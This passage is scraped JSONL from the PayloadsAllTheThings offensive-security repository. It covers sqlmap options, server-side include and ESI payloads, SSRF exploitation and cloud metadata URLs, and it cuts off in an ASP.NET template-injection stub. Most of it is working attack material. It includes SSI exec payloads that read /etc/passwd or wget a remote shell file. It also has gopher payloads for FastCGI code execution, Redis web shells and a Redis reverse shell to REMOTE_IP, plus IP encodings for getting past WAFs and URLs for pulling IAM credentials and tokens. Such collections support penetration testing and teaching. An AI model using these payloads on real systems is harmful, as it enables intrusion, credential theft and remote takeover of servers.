access.\n\n```ps1\nsqlmap -u \"http://example.com/vulnerable.php?id=1\" --sql-query=\"SELECT version()\"\n```\n\n### Evaluate Python Code\n\nThe `--eval` option lets you define or modify request parameters using Python. The evaluated variables can then be used inside the URL, headers, cookies, etc.\n\nParticularly useful in scenarios such as:\n\n* **Dynamic parameters**: When a parameter needs to be randomly or sequentially generated.\n* **Token generation**: For handling CSRF tokens or dynamic auth headers.\n* **Custom logic**: E.g., encoding, encryption, timestamps, etc.\n\n```ps1\nsqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import random; id=random.randint(1,10)\"\nsqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import hashlib;id2=hashlib.md5(id).hexdigest()\"\n```\n\n### Preprocess And Postprocess Scripts\n\n```ps1\nsqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py\n```\n\n#### Preprocessing Script (preprocess.py)\n\nThe preprocessing script is used to modify the request data before it is sent to the target application. This can be useful for encoding parameters, adding headers, or other request modifications.\n\n```ps1\n--preprocess=preprocess.py    Use given script(s) for preprocessing (request)\n```\n\n**Example preprocess.py**:\n\n```ps1\n#!/usr/bin/env python\ndef preprocess(req):\n    print(\"Preprocess\")\n    print(req)\n```\n\n#### Postprocessing Script (postprocess.py)\n\nThe postprocessing script is used to modify the response data after it is received from the target application. This can be useful for decoding responses, extracting specific data, or other response modifications.\n\n```ps1\n--postprocess=postprocess.py  Use given script(s) for postprocessing (response)\n```\n\n## Reduce Requests Number\n\nThe parameter `--test-filter` is helpful when you want to focus on specific types of SQL injection techniques or payloads. Instead of testing the full range of payloads that SQLMap has, you can limit it to those that match a certain pattern, making the process more efficient, especially on large or slow web applications.\n\n```ps1\nsqlmap -u \"https://www.target.com/page.php?category=demo\" -p category --test-filter=\"Generic UNION query (NULL)\"\nsqlmap -u \"https://www.target.com/page.php?category=demo\" --test-filter=\"boolean\"\n```\n\nBy default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary.\n\n```ps1\nsqlmap -u \"https://www.target.com/page.php?id=1\" --level=1 --risk=1\n```\n\nUse the `--technique` option to specify the types of SQL injection techniques to test for, rather than testing all possible ones.\n\n```ps1\nsqlmap -u \"https://www.target.com/page.php?id=1\" --technique=B\n```\n\n## SQLmap Without SQL Injection\n\nUsing SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing.\n\nYou can use SQLmap to access a database via its port instead of a URL.\n\n```ps1\nsqlmap -d \"mysql://user:pass@ip/database\" --dump-all\n```\n\n## References\n\n* [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)\n* [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)\n", "timestamp": "2025-10-21T13:30:18.640612"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Include Injection/Files/ssi_esi.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Include%20Injection/Files/ssi_esi.txt", "content": "<!--#config errmsg=\"File not found, informs users and password\"-->\n<!--#config timefmt=\"A %B %d %Y %r\"-->\n<!--#echo var=\"DATE_LOCAL\" -->\n<!--#echo var=\"DOCUMENT_NAME\" -->\n<!--#echo var=\"DOCUMENT_URI\" -->\n<!--#echo var=\"auth_type\" -->\n<!--#echo var=\"content_length\" -->\n<!--#echo var=\"content_type\" -->\n<!--#echo var=\"date_gmt\" -->\n<!--#echo var=\"date_local\" -->\n<!--#echo var=\"document_name\" -->\n<!--#echo var=\"document_root\" -->\n<!--#echo var=\"document_uri\" -->\n<!--#echo var=\"forwarded\" -->\n<!--#echo var=\"from\" -->\n<!--#echo var=\"gateway_interface\" -->\n<!--#echo var=\"http_accept\" -->\n<!--#echo var=\"http_accept_charset\" -->\n<!--#echo var=\"http_accept_encoding\" -->\n<!--#echo var=\"http_accept_language\" -->\n<!--#echo var=\"http_client_ip\" -->\n<!--#echo var=\"http_connection\" -->\n<!--#echo var=\"http_cookie\" -->\n<!--#echo var=\"http_form\" -->\n<!--#echo var=\"http_host\" -->\n<!--#echo var=\"http_referer\" -->\n<!--#echo var=\"http_ua_cpu\" -->\n<!--#echo var=\"http_ua_os\" -->\n<!--#echo var=\"http_user_agent\" -->\n<!--#echo var=\"last_modified\" -->\n<!--#echo var=\"netsite_root\" -->\n<!--#echo var=\"page_count\" -->\n<!--#echo var=\"path\" -->\n<!--#echo var=\"path_info\" -->\n<!--#echo var=\"path_info_translated\" -->\n<!--#echo var=\"path_translated\" -->\n<!--#echo var=\"query_string\" -->\n<!--#echo var=\"query_string_unescaped\" -->\n<!--#echo var=\"remote_addr\" -->\n<!--#echo var=\"remote_host\" -->\n<!--#echo var=\"remote_ident\" -->\n<!--#echo var=\"remote_port\" -->\n<!--#echo var=\"remote_user\" -->\n<!--#echo var=\"request_method\" -->\n<!--#echo var=\"request_uri\" -->\n<!--#echo var=\"script_filename\" -->\n<!--#echo var=\"script_name\" -->\n<!--#echo var=\"script_uri\" -->\n<!--#echo var=\"script_url\" -->\n<!--#echo var=\"server_addr\" -->\n<!--#echo var=\"server_admin\" -->\n<!--#echo var=\"server_name -->\n<!--#echo var=\"server_port\" -->\n<!--#echo var=\"server_protocol\" -->\n<!--#echo var=\"server_software\" -->\n<!--#echo var=\"site_htmlroot\" -->\n<!--#echo var=\"total_hits\" -->\n<!--#echo var=\"tz\" -->\n<!--#echo var=\"unique_id\" -->\n<!--#echo var=\"user_name\" -->\n<!--#exec cmd=\"/bin/ls /\" -->\n<!--#exec cmd=\"cat /etc/passwd\" -->\n<!--#exec cmd=\"cd C:\\WINDOWS\\System32\">\n<!--#exec cmd=\"curl http://sn1persecurity.com/.testing/rfi_vuln.php\" -->\n<!--#exec cmd=\"dir\" -->\n<!--#exec cmd=\"ipconfig\" -->\n<!--#exec cmd=\"ls\" -->\n<!--#exec cmd=\"perl -e 'print \"X\"*5000'\" -->\n<!--#exec cmd=\"sleep 10\" -->\n<!--#exec cmd=\"sleep 5\" -->\n<!--#exec cmd=\"uname\" -->\n<!--#exec cmd=\"wget http://website.com/dir/shell.txt\" -->\n<!--#exec cmd=\"whoami\" -->\n<!--#exec cmd=\"whoami\"-->\n<!--#flastmod virtual=\"echo.html\" -->\n<!--#fsize file=\"ssi.shtml\" -->\n<!--#include file=?UUUUUUUU...UU?-->\n<!--#include virtual=\"/\" -->\n<!--#include virtual=\"/index.html\" -->\n<!--#include virtual=\"http://sn1persecurity.com/.testing/rfi_vuln.php\" -->\n<!--#include virtual=\"https://crowdshield.com/.testing/rfi_vuln.php\" -->\n<!--#printenv -->\n</nowiki>\n<esi:debug/>\n<esi:include src=\"http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/\"/>\n<esi:include src=\"http://host/poc.xml\" dca=\"xslt\" stylesheet=\"http://google.com/poc.xsl\" />\n<esi:include src=http://google.com/>\n<pre><!--#echo var=\"DATE_LOCAL\" --> </pre>\n<pre><!--#exec cmd=\"dir\" --></pre>\n<pre><!--#exec cmd=\"ls\" --></pre>\n<pre><!--#exec cmd=\"whoami\"--></pre>\nx=<esi:assign name=\"var1\" value=\"'cript'\"/><s<esi:vars name=\"$(var1)\"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name=\"$(var1)\"/>>", "timestamp": "2025-10-21T13:30:19.319027"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Request Forgery/SSRF-Advanced-Exploitation.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md", "content": "# SSRF Advanced Exploitation\n\n> Some services (e.g., Redis, Elasticsearch) allow unauthenticated data writes or command execution when accessed directly. An attacker could exploit SSRF to interact with these services, injecting malicious payloads like web shells or manipulating application state.\n\n## Summary\n\n* [DNS AXFR](#dns-axfr)\n* [FastCGI](#fastcgi)\n* [Memcached](#memcached)\n* [MySQL](#memcached)\n* [Redis](#redis)\n* [SMTP](#smtp)\n* [WSGI](#wsgi)\n* [Zabbix](#zabbix)\n* [References](#references)\n\n## DNS AXFR\n\nQuery an internal DNS resolver to trigger a full zone transfer (**AXFR**) and exfiltrate a list of subdomains.\n\n```py\nfrom urllib.parse import quote\ndomain,tld = \"example.lab\".split('.')\ndns_request =  b\"\\x01\\x03\\x03\\x07\"    # BITMAP\ndns_request += b\"\\x00\\x01\"            # QCOUNT\ndns_request += b\"\\x00\\x00\"            # ANCOUNT\ndns_request += b\"\\x00\\x00\"            # NSCOUNT\ndns_request += b\"\\x00\\x00\"            # ARCOUNT\ndns_request += len(domain).to_bytes() # LEN DOMAIN\ndns_request += domain.encode()        # DOMAIN\ndns_request += len(tld).to_bytes()    # LEN TLD\ndns_request += tld.encode()           # TLD\ndns_request += b\"\\x00\"                # DNAME EOF\ndns_request += b\"\\x00\\xFC\"            # QTYPE AXFR (252)\ndns_request += b\"\\x00\\x01\"            # QCLASS IN (1)\ndns_request = len(dns_request).to_bytes(2, byteorder=\"big\") + dns_request\nprint(f'gopher://127.0.0.1:25/_{quote(dns_request)}')\n```\n\nExample of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`\n\n```ps1\ncurl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd\n```\n\n## FastCGI\n\nRequires to know the full path of one PHP file on the server, by default the exploit is using `/usr/share/php/PEAR.php`.\n\n```ps1\ngopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00\n```\n\n## Memcached\n\nMemcached communicates over port 11211 by default. While it is primarily used for storing serialized data to enhance application performance, vulnerabilities can arise during the deserialization of this data.\n\n```ps1\npython2.7 ./gopherus.py --exploit pymemcache\npython2.7 ./gopherus.py --exploit rbmemcache\npython2.7 ./gopherus.py --exploit phpmemcache\npython2.7 ./gopherus.py --exploit dmpmemcache\n```\n\n## MySQL\n\nMySQL user should not be password protected.\n\n```ps1\n$ python2.7 ./gopherus.py --exploit mysql\nGive MySQL username: root\nGive query to execute: SELECT 123;\n\ngopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01\n```\n\n## Redis\n\n> Redis is a database system that stores everything in RAM\n\nThe attacker changes Redis's dump directory to the web server's document root (`/var/www/html`) and renames the dump file to `file.php`, ensuring that when the database is saved, it generates a PHP file. They then create a Redis key (`mykey`) containing the web shell code, which enables remote command execution via HTTP GET parameters. Finally, the `SAVE` command forces Redis to write the current in-memory database to disk, resulting in the creation of the malicious web shell at `/var/www/html/file.php`.\n\n```ps1\nCONFIG SET dir /var/www/html\nCONFIG SET dbfilename file.php\nSET mykey \"<?php system($_GET[0])?>\"\nSAVE\n```\n\n* Getting a webshell with `dict://`\n\n    ```powershell\n    dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html\n    dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php\n    dict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\"\n    dict://127.0.0.1:6379/SAVE\n    ```\n\n* Getting a PHP reverse shell with `gopher://`\n\n    ```powershell\n    gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml\n    gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php\n    gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22\n    gopher://127.0.0.1:6379/_save\n    ```\n\n## SMTP\n\nMalicious actors can craft `gopher://` URLs to manipulate low-level protocols (like HTTP or SMTP) on internal systems.\n\n```ps1\ngopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A\n```\n\nThe following PHP script can be used to generate a page that will redirect to the `gopher://` payload.\n\n```php\n<?php\n    $commands = array(\n            'HELO victim.com',\n            'MAIL FROM: <admin@victim.com>',\n            'RCPT To: <hacker@attacker.com>',\n            'DATA',\n            'Subject: @hacker!',\n            'Hello Friend',\n            '.'\n    );\n    $payload = implode('%0A', $commands);\n    header('Location: gopher://0:25/_'.$payload);\n?>\n```\n\n## WSGI\n\nExploit using the Gopher protocol, full exploit script available at [wofeiwo/webcgi-exploits/uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py).\n\n```powershell\ngopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py\n```\n\n| Header    |           |             |\n|-----------|-----------|-------------|\n| modifier1 | (1 byte)  | 0 (%00)     |\n| datasize  | (2 bytes) | 26 (%1A%00) |\n| modifier2 | (1 byte)  | 0 (%00)     |\n\n| Variable (UWSGI_FILE) |           |    |                |\n|-----------------------|-----------|----|----------------|\n| key length            | (2 bytes) | 10 | (%0A%00)       |\n| key data              | (m bytes) |    | UWSGI_FILE     |\n| value length          | (2 bytes) | 12 | (%0C%00)       |\n| value data            | (n bytes) |    | /tmp/test.py   |\n\n## Zabbix\n\nIf `EnableRemoteCommands=1` is enabled in the Zabbix Agent configuration, it allows the execution of remote commands.\n\n```ps1\ngopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D\n```\n\n## References\n\n* [SSRFmap - Introducing the AXFR Module - Swissky - June 13, 2024](https://swisskyrepo.github.io/SSRFmap-axfr/)\n* [How I Converted SSRF to XSS in Jira - Ashish Kunwar - June 1, 2018](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)\n* [Pong [EN] | FCSC 2024 - Arthur Deloffre (@Vozec1) - April 12, 2024](https://vozec.fr/writeups/pong-fcsc2024-en/)\n* [Pong [EN] | FCSC 2024 - Kévin - Mizu (@kevin_mizu) - April 13, 2024](https://mizu.re/post/pong)\n", "timestamp": "2025-10-21T13:30:20.180339"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Request Forgery/SSRF-Cloud-Instances.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md", "content": "\n# SSRF URL for Cloud Instances\n\n> When exploiting Server-Side Request Forgery (SSRF) in cloud environments, attackers often target metadata endpoints to retrieve sensitive instance information (e.g., credentials, configurations). Below is a categorized list of common URLs for various cloud and infrastructure providers\n\n## Summary\n\n* [SSRF URL for AWS Bucket](#ssrf-url-for-aws)\n* [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)\n* [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)\n* [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)\n* [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)\n* [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)\n* [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)\n* [SSRF URL for Azure](#ssrf-url-for-azure)\n* [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)\n* [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)\n* [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)\n* [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)\n* [SSRF URL for Alibaba](#ssrf-url-for-alibaba)\n* [SSRF URL for Hetzner Cloud](#ssrf-url-for-hetzner-cloud)\n* [SSRF URL for Docker](#ssrf-url-for-docker)\n* [SSRF URL for Rancher](#ssrf-url-for-rancher)\n* [References](#references)\n\n## SSRF URL for AWS\n\nThe AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)\n\n* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`\n* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`\n\n  ```powershell\n  export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`\n  curl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"\n  ```\n\n* IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/`\n\nIn case of a WAF, you might want to try different ways to connect to the API.\n\n* DNS record pointing to the AWS API IP\n\n  ```powershell\n  http://instance-data\n  http://169.254.169.254\n  http://169.254.169.254.nip.io/\n  ```\n\n* HTTP redirect\n\n  ```powershell\n  Static:http://nicob.net/redir6a\n  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-\n  ```\n\n* Encoding the IP to bypass WAF\n\n  ```powershell\n  http://425.510.425.510 Dotted decimal with overflow\n  http://2852039166 Dotless decimal\n  http://7147006462 Dotless decimal with overflow\n  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal\n  http://0xA9FEA9FE Dotless hexadecimal\n  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow\n  http://0251.0376.0251.0376 Dotted octal\n  http://0251.00376.000251.0000376 Dotted octal with padding\n  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)\n  http://[::ffff:a9fe:a9fe] IPV6 Compressed\n  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded\n  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4\n  http://[fd00:ec2::254] IPV6\n  ```\n\nThese URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.\n\n```powershell\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]\n```\n\nThis URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.\n\n```powershell\nhttp://169.254.169.254/latest/user-data\n```\n\nOther URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.\n\n```powershell\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/ami-id\nhttp://169.254.169.254/latest/meta-data/reservation-id\nhttp://169.254.169.254/latest/meta-data/hostname\nhttp://169.254.169.254/latest/meta-data/public-keys/\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\nhttp://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\n```\n\n**Examples**:\n\n* Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`\n* *Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`\n\n## SSRF URL for AWS ECS\n\nIf you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.\n\n```powershell\ncurl http://169.254.170.2/v2/credentials/<UUID>\n```\n\nThis way you'll extract IAM keys of the attached role\n\n## SSRF URL for AWS Elastic Beanstalk\n\nWe retrieve the `accountId` and `region` from the API.\n\n```powershell\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role\n```\n\nWe then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.\n\n```powershell\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role\n```\n\nThen we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.\n\n## SSRF URL for AWS Lambda\n\nAWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.\n\n```powershell\nhttp://localhost:9001/2018-06-01/runtime/invocation/next\nhttp://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\n```\n\nDocs: <https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next>\n\n## SSRF URL for Google Cloud\n\n:warning: Google is shutting down support for usage of the **v1 metadata service** on January 15.\n\nRequires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\"\n\n```powershell\nhttp://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n```\n\nGoogle allows recursive pulls\n\n```powershell\nhttp://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true\n```\n\nBeta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)\n\n```powershell\nhttp://metadata.google.internal/computeMetadata/v1beta1/\nhttp://metadata.google.internal/computeMetadata/v1beta1/?recursive=true\n```\n\nRequired headers can be set using a gopher SSRF with the following technique\n\n```powershell\ngopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a\n```\n\nInteresting files to pull out:\n\n* SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`\n* Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`\n* Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`\n\n### Add an SSH key\n\nExtract the token\n\n```powershell\nhttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json\n```\n\nCheck the scope of the token\n\n```powershell\n$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  \n\n{ \n        \"issued_to\": \"101302079XXXXX\", \n        \"audience\": \"10130207XXXXX\", \n        \"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\", \n        \"expires_in\": 2443, \n        \"access_type\": \"offline\" \n}\n```\n\nNow push the SSH key.\n\n```powershell\ncurl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" \n-H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\" \n-H \"Content-Type: application/json\" \n--data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'\n```\n\n## SSRF URL for Digital Ocean\n\nDocumentation available at `https://developers.digitalocean.com/documentation/metadata/`\n\n```powershell\ncurl http://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/ \nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data\nhttp://169.254.169.254/metadata/v1/hostname\nhttp://169.254.169.254/metadata/v1/region\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address\n\nAll in one request:\ncurl http://169.254.169.254/metadata/v1.json | jq\n```\n\n## SSRF URL for Packetcloud\n\nDocumentation available at `https://metadata.packet.net/userdata`\n\n## SSRF URL for Azure\n\nLimited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`\n\n```powershell\nhttp://169.254.169.254/metadata/v1/maintenance\n```\n\nUpdate Apr 2017, Azure has more support; requires the header \"Metadata: true\" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`\n\n```powershell\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text\n```\n\n## SSRF URL for OpenStack/RackSpace\n\n(header required? unknown)\n\n```powershell\nhttp://169.254.169.254/openstack\n```\n\n## SSRF URL for HP Helion\n\n(header required? unknown)\n\n```powershell\nhttp://169.254.169.254/2009-04-04/meta-data/ \n```\n\n## SSRF URL for Oracle Cloud\n\n```powershell\nhttp://192.0.0.192/latest/\nhttp://192.0.0.192/latest/user-data/\nhttp://192.0.0.192/latest/meta-data/\nhttp://192.0.0.192/latest/attributes/\n```\n\n## SSRF URL for Alibaba\n\n```powershell\nhttp://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/image-id\n```\n\n## SSRF URL for Hetzner Cloud\n\n```powershell\nhttp://169.254.169.254/hetzner/v1/metadata\nhttp://169.254.169.254/hetzner/v1/metadata/hostname\nhttp://169.254.169.254/hetzner/v1/metadata/instance-id\nhttp://169.254.169.254/hetzner/v1/metadata/public-ipv4\nhttp://169.254.169.254/hetzner/v1/metadata/private-networks\nhttp://169.254.169.254/hetzner/v1/metadata/availability-zone\nhttp://169.254.169.254/hetzner/v1/metadata/region\n```\n\n## SSRF URL for Kubernetes ETCD\n\nCan contain API keys and internal ip and ports\n\n```powershell\ncurl -L http://127.0.0.1:2379/version\ncurl http://127.0.0.1:2379/v2/keys/?recursive=true\n```\n\n## SSRF URL for Docker\n\n```powershell\nhttp://127.0.0.1:2375/v1.24/containers/json\n\nSimple example\ndocker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash\nbash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json\nbash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json\n```\n\nMore info:\n\n* Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>\n* Docker Engine API: <https://docs.docker.com/engine/api/latest/>\n\n## SSRF URL for Rancher\n\n```powershell\ncurl http://rancher-metadata/<version>/<path>\n```\n\nMore info: <https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/>\n\n## References\n\n* [Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - December 13, 2017](https://web.archive.org/web/20180210093624/https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)\n* [Exploiting SSRF in AWS Elastic Beanstalk - Sunil Yadav - February 1, 2019](https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)\n", "timestamp": "2025-10-21T13:30:20.286555"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Template Injection/ASP.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/ASP.md", "content": "# Server Side Template Injection - ASP.NET\n\n> Server-Side Template Injection (SSTI)  is a class of vulnerabilities where an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary code on the server. In the context of ASP.NET, SSTI can occur if user input is directly embedded into a template (such as Razor, ASPX, or other templating engines) without proper sanitization.\n\n## Summary\n\n- [ASP.NET Razor](#aspnet-razor)\n    - [ASP.NET Razor - Basic Injection](#aspnet-razor---basic-injection)\n    - [ASP.NET Razor - Command Execution](#aspnet-razor---command-execution)\n- [References](#references)\n\n## ASP.NET Razor\n\n[Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)\n\n> Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.\n\n### ASP.NET Razor - Basic Injection\n\n```powershell\n@(1+2)\n```\n\n### ASP.NET Razor - Command Execution\n\n```csharp\n@{\n  // C# code\n}\n```\n\n## References\n\n- [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - April 15, 